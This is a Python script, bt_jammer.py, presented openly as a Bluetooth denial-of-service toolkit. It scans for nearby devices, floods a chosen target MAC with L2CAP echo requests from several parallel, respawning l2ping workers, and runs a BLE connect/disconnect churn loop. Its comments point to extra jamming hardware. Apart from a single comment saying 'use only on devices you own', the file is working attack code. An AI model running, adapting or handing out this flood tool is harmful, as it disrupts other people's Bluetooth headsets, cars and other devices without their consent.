#!/usr/bin/env python3
# language: Python 3.8+, file: bt_jammer.py, target: Linux, needs BlueZ + BT adapter
# Bluetooth DoS toolkit — L2CAP echo flood (BTStorm/bluthat style) + BLE connect flood.
# Deps: bluez (bluetoothctl, l2ping). Classic BT flood needs a BR/EDR target;
# BLE-only devices (modern earbuds, keyfobs) ignore L2CAP echo — for raw BLE
# jamming you need NRF24L01+PA+LNA (HailHound-style) or btlejack hardware.
# Use only on devices you own.

import argparse
import os
import re
import shutil
import signal
import subprocess
import sys
import time


def need(exe):
    if not shutil.which(exe):
        sys.exit(f"[!] {exe} not found — install bluez: sudo apt install bluez")


def scan_devices(timeout=15):
    """bluetoothctl scan -> [(mac, name), ...]"""
    need("bluetoothctl")
    subprocess.run(["bluetoothctl", "--timeout", str(timeout), "scan", "on"],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    out = subprocess.run(["bluetoothctl", "devices"],
                         capture_output=True, text=True).stdout
    devs = []
    for line in out.splitlines():
        m = re.match(r"Device\s+([0-9A-Fa-f:]{17})\s*(.*)", line.strip())
        if m:
            devs.append((m.group(1).upper(), m.group(2).strip()))
    return devs


def cmd_scan(args):
    print(f"[*] scanning {args.time}s — move your target device around")
    devs = scan_devices(args.time)
    print(f"\n{'MAC':<18} {'NAME'}")
    print("-" * 50)
    for mac, name in devs:
        print(f"{mac:<18} {name}")
    if not devs:
        print("[!] nothing found — adapter up? rfkill list / bluetoothctl show")
    else:
        print(f"\n[*] {len(devs)} devices. flood one:  python3 bt_jammer.py flood <MAC>")


def l2ping_worker(bdaddr, interval):
    """One l2ping process; respawns if it exits. Flood = N of these."""
    while True:
        p = subprocess.run(["l2ping", "-i", str(interval), bdaddr],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(0.05)  # tiny gap, then hammer again


def cmd_flood(args):
    need("l2ping")
    bdaddr = args.target.upper()
    if not re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", bdaddr):
        sys.exit(f"[!] bad MAC: {bdaddr}")

    print(f"[*] L2CAP echo flood -> {bdaddr}")
    print(f"[*] workers={args.workers} interval={args.interval}s  Ctrl+C to stop")
    print("[*] target must be Classic BT (headset/speaker/car/older phone)")

    workers = []
    for _ in range(args.workers):
        pid = os.fork() if hasattr(os, "fork") else None
        if pid == 0:
            l2ping_worker(bdaddr, args.interval)
            os._exit(0)
        elif pid:
            workers.append(pid)
        else:  # no fork (non-Linux) — inline
            try:
                l2ping_worker(bdaddr, args.interval)
            except KeyboardInterrupt:
                pass
            return
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        for pid in workers:
            try:
                os.kill(pid, signal.SIGTERM)
            except OSError:
                pass
        print("\n[*] stopped")


def btctl(*argv, timeout=8):
    try:
        return subprocess.run(["bluetoothctl", *argv],
                              capture_output=True, text=True,
                              timeout=timeout).stdout
    except subprocess.TimeoutExpired:
        return ""


def cmd_ble_flood(args):
    """Repeated BLE connect/disconnect churn — stresses BLE link layer.
    Cruder than L2CAP flood but touches BLE-only devices."""
    need("bluetoothctl")
    bdaddr = args.target.upper()
    print(f"[*] BLE connect-flood -> {bdaddr}  Ctrl+C to stop")
    print("[*] requires target to accept BLE connections")
    try:
        n = 0
        while True:
            btctl("connect", bdaddr, timeout=6)
            btctl("disconnect", bdaddr, timeout=6)
            n += 1
            if n % 10 == 0:
                print(f"    {n} cycles", flush=True)
    except KeyboardInterrupt:
        btctl("disconnect", bdaddr)
        print(f"\n[*] stopped after {n} cycles")


def main():
    p = argparse.ArgumentParser(
        description="Bluetooth DoS toolkit — L2CAP flood + BLE connect flood",
        epilog="workflow:\n"
               "  python3 bt_jammer.py scan -t 20            # find your BT device MAC\n"
               "  python3 bt_jammer.py flood AA:BB:CC:DD:EE:FF -w 8\n"
               "  python3 bt_jammer.py ble-flood AA:BB:CC:DD:EE:FF",
        formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = p.add_subparsers(dest="cmd", required=True)

    s = sub.add_parser("scan", help="list nearby BT/BLE devices")
    s.add_argument("-t", "--time", type=int, default=15, help="scan seconds")

    f = sub.add_parser("flood", help="L2CAP echo flood (Classic BT)")
    f.add_argument("target", help="target BDADDR, e.g. AA:BB:CC:DD:EE:FF")
    f.add_argument("-w", "--workers", type=int, default=6,
                   help="parallel l2ping processes (default 6)")
    f.add_argument("-i", "--interval", type=float, default=0.01,
                   help="seconds between pings per worker (default 0.01)")

    b = sub.add_parser("ble-flood", help="BLE connect/disconnect churn")
    b.add_argument("target", help="target BLE BDADDR")

    args = p.parse_args()
    if args.cmd == "scan":
        cmd_scan(args)
    elif args.cmd == "flood":
        cmd_flood(args)
    elif args.cmd == "ble-flood":
        cmd_ble_flood(args)


if __name__ == "__main__":
    main()
